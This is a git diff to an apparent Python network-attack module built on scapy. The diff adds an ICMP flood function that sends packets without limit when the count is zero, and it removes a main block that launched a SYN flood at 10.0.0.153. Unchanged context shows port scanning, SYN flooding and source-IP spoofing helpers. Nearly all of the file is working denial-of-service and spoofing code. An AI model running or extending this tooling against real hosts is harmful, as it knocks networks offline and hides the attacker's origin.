@@ -1,15 +1,28 @@
-import random
-from scapy.layers.inet import TCP, IP
-from scapy.sendrecv import sr1, send
-from scapy.volatile import RandIP
 from Constants.constants import *
 from Constants.errorconstants import *
+import random
+from scapy.layers.inet import TCP, IP, ICMP
+from scapy.sendrecv import sr1, send
+from scapy.volatile import RandIP
 import sys
 
 
 class Attack:
     def __init__(self):
         pass
+
+    @staticmethod
+    def icmp_flood(target_ip: str, num_of_pkts: int):
+        # Initialize
+        print(ICMP_FLOOD_INIT_MSG + f"[IP: {target_ip}]")
+
+        # Make packet
+        ip_header = IP(dst=target_ip)
+        icmp = ICMP()
+        packet = ip_header / icmp
+
+        # Send ICMP Packets
+        _send_icmp_flood(packet, num_of_pkts)
 
     @staticmethod
     def port_scan(target_ip: str, src_ip: str, min_port: int, max_port: int):
@@ -112,6 +125,16 @@ def _source_ip_spoofer(source_ip):
     return source_ip
 
 
+def _send_icmp_flood(packet, num_of_pkts):
+    if num_of_pkts is ZERO:
+        print(ICMP_FLOOD_STOP_MSG)
+        send(packet, loop=1)
+        print(ICMP_FLOOD_COMPLETE_FORCE_MSG)
+    else:
+        send(packet, loop=1, count=num_of_pkts)
+        print(ICMP_FLOOD_COMPLETE_MSG)
+
+
 def _send_syn_flood(num_of_pkts, packet):
     if num_of_pkts is ZERO:
         print(SYN_FLOOD_STOP_MSG)
@@ -139,7 +162,3 @@ def _port_randomizer(port: int):
         print(RANDOMIZE_FINAL_MSG + str(port))
 
     return port
-
-
-if __name__ == '__main__':
-    Attack.syn_flood("10.0.0.153", 0, 69)
